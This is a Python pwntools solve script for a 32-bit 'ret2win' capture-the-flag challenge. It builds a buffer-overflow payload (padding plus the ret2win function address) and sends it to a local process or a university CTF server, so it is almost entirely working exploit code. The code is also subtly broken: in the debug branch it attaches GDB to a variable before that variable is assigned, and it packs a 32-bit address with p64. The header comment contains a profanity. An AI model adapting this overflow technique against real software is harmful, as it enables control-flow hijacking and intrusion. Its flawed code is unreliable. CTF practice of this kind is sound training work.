#!/usr/bin/python3

''' THE GIVEN BINARY WAS BROKEN PORCODIO '''

from pwn import *

e = ELF("./ret2win32_patched")

ADDRESS = 'cyberchallenge.diag.uniroma1.it'
PORT = 5014

context.binary = e
context.terminal = ['ptyxis', '-e']
# context.log_level = 'debug'


def conn():
    if args.REMOTE:
        r = remote(ADDRESS, PORT)
    else:
        if args.GDB:
            gdb.attach(r)
        r = process([e.path])

    return r 


def main():
    r = conn()
    
    # Buffer overflow (32 bits)
    r.recvuntil(b"> ")
    payload = b"A"*40 # Write the array out of bounds
    payload += b"B"*4 # Base pointer in 32 bit is 4 byte
    payload += p64(e.symbols.ret2win) # Address of the ret2win func
    r.send(payload)
    # good luck pwning :)

    r.interactive()

if __name__ == "__main__":
    main()
